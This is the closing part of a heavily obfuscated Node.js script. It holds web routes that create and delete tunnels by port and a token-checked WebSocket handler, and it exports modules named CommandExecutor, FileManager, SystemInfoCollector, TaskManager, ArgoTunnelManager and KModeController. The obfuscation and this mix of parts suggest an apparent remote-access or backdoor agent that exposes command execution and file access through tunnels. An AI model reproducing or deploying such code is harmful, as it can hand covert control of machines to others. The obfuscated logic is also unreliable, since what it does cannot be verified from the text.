                const r = await k['create'](q, o[fE(0x39b)] === !![]);
                n[fE(0x707)]({
                    'status': 'ok',
                    'created': !![],
                    'tunnel_domain': r[fE(0x57a)],
                    'port': r['port'],
                    'created_at': r[fE(0x50c)]
                });
            } catch (s) {
                n[fE(0x296)](s[fE(0x296)] || 0x1f4)[fE(0x707)]({
                    'status': b[fE(0x5d8)],
                    'created': ![],
                    'port': s['port'] ?? null,
                    'message': s[fE(0x257)]
                });
            }
        }), i[f6(0x56c)](b['aqLJd'], async (m, n) => {
            const fF = f6;
            try {
                const o = a0aE(m[fF(0x4ca)]), p = o[fF(0x2bb)], q = b[fF(0x691)](Number, p);
                if (b[fF(0x167)](p, undefined) || b[fF(0x579)](p, null) || p === '' || !Number[fF(0x44b)](q) || b[fF(0x720)](q, 0x1) || b[fF(0x765)](q, 0xffff))
                    return n[fF(0x296)](0x1a6)[fF(0x707)]({
                        'status': fF(0x3bf),
                        'deleted': 0x0,
                        'port': b[fF(0x29a)](p, null),
                        'message': b[fF(0x4b7)]
                    });
                const r = await k[fF(0x2c6)](q, o['tunnel_domain']);
                if (b[fF(0x167)](r['status'], 'ok'))
                    return n[fF(0x707)]({
                        'status': 'ok',
                        'deleted': r[fF(0x4d4)],
                        'port': q,
                        'tunnels': r['tunnels']
                    });
                return n[fF(0x296)](r[fF(0x296)])[fF(0x707)]({
                    'status': fF(0x3bf),
                    'deleted': 0x0,
                    'port': q,
                    'message': r['message']
                });
            } catch (s) {
                n['status'](0x1f4)[fF(0x707)]({
                    'status': b['JtdtU'],
                    'deleted': 0x0,
                    'message': s[fF(0x257)]
                });
            }
        }), a0C[f6(0x66e)](b[f6(0x569)]), i['ws'](b['xTHmT'], async (m, n) => {
            const fG = f6, o = n[fG(0x333)][0x0];
            a0C[fG(0x66e)]('WebSocket\x20request\x20URL:\x20' + n[fG(0x567)]), a0C[fG(0x66e)](fG(0x261) + o);
            const p = n[fG(0x188)][fG(0x1de)], q = n[fG(0x188)][fG(0x30a)];
            a0C[fG(0x66e)](fG(0x67c) + p);
            if (!p) {
                a0C['debug'](fG(0x49d)), m[fG(0x52d)](0x3f0, b[fG(0x4d7)]);
                return;
            }
            if (q) {
                const s = a0O['wsDowngradeToken'](), t = Buffer['from'](String(q), fG(0x17a)), u = Buffer[fG(0x6ef)](s, b['NBWID']), v = b['HuyuW'](t['length'], u[fG(0x54b)]) && a0k[fG(0x5e0)](t, u);
                if (!v) {
                    a0C['warn'](fG(0x784) + p + fG(0x57d)), m[fG(0x52d)](0x3f0, b[fG(0x395)]);
                    return;
                }
            }
            const r = new a0aM();
            await r[fG(0x4b5)](m, p, q);
        }), a0C[f6(0x66e)](b[f6(0x68e)]), a0C['debug'](b['JSeYH']);
        const l = i[f6(0x663)](a0O['PORT'], a0O[f6(0x34a)], () => {
            const fH = f6;
            a0C['debug'](fH(0x2d5) + a0O[fH(0x4c5)] + fH(0x770) + a0O[fH(0x34a)] + ':' + a0O[fH(0x5b7)]), a0C[fH(0x66e)](b['wlRLC']), (a0O[fH(0x583)] === '1' || b['dRvVO'](a0O[fH(0x583)], '2') && a0aG[fH(0x669)]()) && a0aG['activate'](k);
        });
        process['on'](f6(0x3b0), () => {
            const fI = f6;
            a0C[fI(0x66e)](fI(0x1dc)), l[fI(0x52d)](), process['exit'](0x0);
        }), a0C[f6(0x66e)](b[f6(0x26f)]);
    } catch (m) {
        a0C[f6(0x3bf)](f6(0x34e), m), process[f6(0x6c0)](0x1);
    }
}
(require['main'] === module || require[a0aQ(0x6df)]?.[a0aQ(0x633)]?.[a0aQ(0x374)](a0aQ(0x1ef))) && a0aN()['catch'](a0C[a0aQ(0x3bf)]);
module['exports'] = {
    'main': a0aN,
    'Config': a0O,
    'CryptoManager': a0Q,
    'SystemInfoCollector': a0T,
    'CommandExecutor': a0U,
    'FileManager': a0W,
    'TaskManager': a0X,
    'ArgoTunnelManager': a0aF,
    'KModeController': a0aG
};